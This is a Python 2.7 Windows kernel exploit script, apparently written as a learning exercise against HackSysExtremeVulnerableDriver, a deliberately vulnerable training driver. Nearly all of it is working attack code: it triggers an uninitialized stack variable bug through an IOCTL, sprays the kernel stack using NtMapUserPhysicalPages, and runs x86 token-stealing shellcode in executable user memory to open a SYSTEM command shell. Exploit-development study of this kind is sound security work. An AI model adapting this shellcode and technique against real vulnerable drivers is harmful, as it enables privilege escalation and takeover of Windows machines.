# -*- coding: utf-8 -*-

from ctypes import *
import ctypes
import os
import struct
import subprocess
import sys
import time

kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.Psapi
gdi32 = windll.gdi32
user32 = windll.user32


def debug_print(message):
    """ debug_debug_prints message in terminal and debugger """
    print(message)
    kernel32.OutputDebugStringA(message + "\n")


def hexdump(ptr, num):
    """
    Hexdump memory region - DEBUG

    0000 | 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00  | .ELF............
    0010 | 03 00 3e 00 01 00 00 00 10 42 0d 00 00 00 00 00  | ..>......B......
    0020 | 40 00 00 00 00 00 00 00 38 4c 39 00 00 00 00 00  | @.......8.9.....
    0030 | 00 00 00 00 40 00 38 00 09 00 40 00 1e 00 1d 00  | ....@.8...@.....
    0040 | 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00  | ........@.......
    0050 | 40 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  | @.......@.......
    0060 | 08 01 00 00 00 00 00 00 08 01 00 00 00 00 00 00  | ................
    0070 | 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00  | ................
    """
    s = ''
    n = 0
    lines = []
    data = list((num * ctypes.c_byte).from_address(ptr))

    if len(data) == 0:
        return '<empty>'

    for i in range(0, num, 16):
        line = ''
        line += '%04x | ' % (i)
        n += 16

        for j in range(n-16, n):
            if j >= len(data): break
            line += '%02x ' % abs(data[j])

        line += ' ' * (3 * 16 + 7 - len(line)) + ' | '

        for j in range(n-16, n):
            if j >= len(data): break
            c = data[j] if not (data[j] < 0x20 or data[j] > 0x7e) else '.'
            line += '%c' % c

        lines.append(line)

    return '\n'.join(lines)
    

def ctl_code(code):
    """ Recreate CTL_CODE macro to generate driver IOCTL """
    FILE_DEVICE_UNKNOWN = 0x22
    FILE_ANY_ACCESS = 0
    METHOD_NEITHER = 3

    return (
        (FILE_DEVICE_UNKNOWN << 16) |
        (FILE_ANY_ACCESS << 14) | 
        (code << 2) | 
        METHOD_NEITHER
    )


def _HANDLE_driver_connection():
    """ Create handle to driver """
    handle = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", # lpFileName
        0xC0000000,              # dwDesiredAccess
        0,                       # dwShareMode
        None,                    # lpSecurityAttributes
        0x3,                     # dwCreationDisposition
        0,                       # dwFlagsAndAttributes
        None                     # hTemplateFile
    )

    return handle
        

def _send_payload(handle, payload_ptr, payload_len, code):
    """ Interacting with the driver """
    IO_CTL = kernel32.DeviceIoControl(
        handle,             # hDevice
        ctl_code(code),     # dwIoControlCode
        payload_ptr,        # lpInBuffer
        payload_len,        # nInBufferSize
        None,               # lpOutBuffer
        0,                  # nOutBufferSize
        byref(c_ulong()),   # lpBytesReturned
        None                # lpOverlapped
    )
    
    return IO_CTL


def _ret_shellcode_x86():
    shellcode = bytearray(
        #---[Debug]
        #"\xCC"
        #---[Setup]
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00" 	    # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00" 	    # mov ebx, [eax + TOKEN_OFFSET]
        #---[Copy System PID token]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET] <-|
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET           |
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx     |
        "\x75\xED"                      # jnz                           ->|
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        #---[Recover]
        "\x61"                          # popad	
        "\xC3"                          # ret
    )

    return shellcode


def _ret_shellcode_buffer(shellcode):
    """ Payload memory allocation in user-land """
    MEM_COMMIT_MEM_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40

    ptr = kernel32.VirtualAlloc(
        c_int(0),                       # lpAddress
        c_int(len(shellcode)),          # dwSize
        c_int(MEM_COMMIT_MEM_RESERVE),  # flAllocationType
        c_int(PAGE_EXECUTE_READWRITE)   # flProtect
    )
    
    shellcode_ptr = (c_char * len(shellcode)).from_buffer(shellcode)

    kernel32.RtlMoveMemory(
        c_int(ptr),
        shellcode_ptr,
        c_int(len(shellcode))
    )

    return ptr, len(shellcode)
    
    
def NtMapUserPhysicalPages(shellcode_ptr):
    """ Kernel Stack Frame Spraying attack through
    [NtMapUserPhysicalPages] ntdll function """
    nt_result = ntdll.NtMapUserPhysicalPages(
        0,                                       # BaseAddress
        1024,                                    # NumberOfPages 
        struct.pack("<I", shellcode_ptr) * 1024  # PageFrameNumbers
    )

    return nt_result


# PRINTS IDK WHY ARE POLLUTING STACK FRAME. THIS EXPLOIT WORKS AS WELL WHEN IT BE COMMENTED
def _exploit(code):
    """ Execute exploit in order to get nt-authority/SYSTEM shell """
    # driver file handler 
    hFile = _HANDLE_driver_connection()       
    debug_print("\n[+] Driver connection initilized!")
 
    shellcode = _ret_shellcode_x86() 
    shellcode_ptr, shellcode_len = _ret_shellcode_buffer(shellcode)

    debug_print("[*] User-land shellcode allocated at: [0x%x]" % shellcode_ptr)
    debug_print(hexdump(shellcode_ptr, 32))
     
    debug_print("[!] Spraying stack w/ shellcode addresses! BOOM!!")
    NtMapUserPhysicalPages(shellcode_ptr)
    # PRINTS IDK WHY ARE POLLUTING STACK FRAME. THIS EXPLOIT WORKS AS WELL WHEN IT BE COMMENTED
    # debug_print("[+] Kernel Stack Spraying done!")

    # Send the wrong 0xdeadbeef address,
    # and hope to PTR [EBP-0x504-0x108] stay with our malicious shellcode ptr
    payload = struct.pack("<I", 0xdeadbeef) # Trigger bug verification

    payload_len = len(payload)
    payload_ptr = id(payload) + 0x14
    """
     python2.7 id() -> Commom issues and how to deal with it
    
     0: kd> dc 0x1760130
    .---------------------------------------------------------------.
    |01760130  00000001 6a7ae328 00000200 ffffffff  ....(ãzj....ÿÿÿÿ| -> Additional bytes when utilizing python id() function
    |                  .--------------------------------------------'
    |01760140  00000000|41414141 41414141 41414141  ....AAAAAAAAAAAA
    '------------------'
     01760150  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760160  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760170  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760180  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760190  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a0  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    ---------------------------------------------------------------
     0: kd> dc 0x1760130+0x14
     01760144  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760154  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760164  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760174  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA  -> Without additional bytes
     01760184  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     01760194  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601a4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
     017601b4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
    """
    # debug_print("\n[!] payload_ptr: 0x%x\n\tsize: [%s]\n" % (payload_ptr, str(payload_len)))
    # raw_input("[*] Press any key to send payload...")

    # send custom payload -> junk + <shellcode_ptr> 
    _send_payload(
        hFile,
        payload_ptr, # Trigger bug verification
        4,
        code
    )
    
    # debug_print("[+] Exploit Payload Sent!")
    # debug_print("[!] Getting nt-authority/SYSTEM impersonated process shell...")

    os.system("cmd.exe /K") # get SYSTEM shell
    
if __name__ == "__main__":

    """
    TUTORIAL:
        '-> https://h0mbre.github.io/HEVD_UninitializedStackPointer_32bit/
        '-> https://www.fuzzysecurity.com/tutorials/expDev/17.html
    
    IOCTL to trigger Uninitialized stack variable vulnerability
    
    copied from:
        '-> https://github.com/HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h

    usefull WinDBG commands:
        .sympath c:\symbols;c:\hevd
        .reload /f *.*
        ed nt!Kd_Default_Mask 8
        .load pykd
        .load grep
        lm m HEVD
        bp HEVD!TriggerUninitializedMemoryStack+0xf
        bp HEVD!TriggerUninitializedMemoryStack+0x53
        bp nt!NtMapUserPhysicalPages+0x5be
        uf HEVD!TriggerUninitializedMemoryStack
        g

    """
    
    code = 0x80B    # HEVD_IOCTL_UNINITIALIZED_MEMORY_STACK - IOCTL(0x80B)
    _exploit(code)
